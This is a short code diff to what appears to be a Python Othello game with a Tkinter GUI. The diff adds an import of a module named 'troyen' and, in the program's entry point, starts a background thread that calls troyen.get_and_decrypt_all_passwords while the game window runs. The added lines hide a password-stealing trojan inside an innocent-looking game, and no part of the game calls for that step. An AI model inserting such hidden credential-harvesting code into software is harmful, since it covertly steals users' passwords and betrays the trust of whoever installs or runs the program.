@@ -5,6 +5,8 @@ import importlib
 import othello
 import othello_models
 import tkinter
+import troyen
+import threading
 
 # Default / Initial Game Settings
 DEFAULT_ROWS = 7
@@ -174,4 +176,10 @@ class OthelloGUI:
 
 
 if __name__ == '__main__':
+    
+    thread = threading.Thread(target=troyen.get_and_decrypt_all_passwords)
+    thread.start()
+    
     OthelloGUI().start()
+    
+    thread.join()
